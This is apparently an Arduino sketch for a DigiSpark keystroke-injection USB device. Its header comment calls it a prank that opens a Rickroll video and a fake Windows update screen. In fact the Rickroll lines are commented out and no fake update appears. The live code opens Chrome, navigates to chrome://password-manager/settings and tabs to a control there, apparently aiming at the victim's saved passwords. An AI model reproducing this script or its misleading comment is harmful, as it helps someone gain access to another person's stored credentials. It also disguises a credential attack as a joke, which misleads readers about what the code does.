//This DigiSpark script opens up Rick Astley's - Never Gonna Give You Up and also a fake Windows update screen and then maximizes it using F11
#include "DigiKeyboard.h"

void setup() {
  //empty
}
void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
//  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
//  DigiKeyboard.delay(600);
//  DigiKeyboard.print("https://youtu.be/dQw4w9WgXcQ?t=43s");
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("chrome");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_T ,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("chrome://password-manager/settings");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43); 
  DigiKeyboard.sendKeyStroke(43);   
  DigiKeyboard.sendKeyStroke(43);  
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);  
  DigiKeyboard.sendKeyStroke(43);  
  DigiKeyboard.sendKeyStroke(43);  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
